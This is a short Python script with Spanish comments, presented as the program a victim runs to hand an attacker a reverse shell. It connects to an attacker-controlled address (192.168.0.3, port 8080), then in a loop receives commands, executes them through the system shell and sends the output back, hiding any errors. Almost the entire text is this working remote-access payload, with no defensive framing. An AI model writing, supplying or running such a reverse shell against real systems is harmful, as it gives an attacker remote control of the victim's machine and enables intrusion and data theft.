## Esto será el script que tiene que ejecutar la víctima para enviarle al atacante la shell reversa:

import socket
import subprocess

cliente=socket.socket()
try:
    cliente.connect(('192.168.0.3',8080)) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará la víctima.
    cliente.send("1".encode("ascii"))

    while True:
        comandoBytes=cliente.recv(1024)
        comandoCodificado=comandoBytes.decode("ascii")
        comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
except:
    pass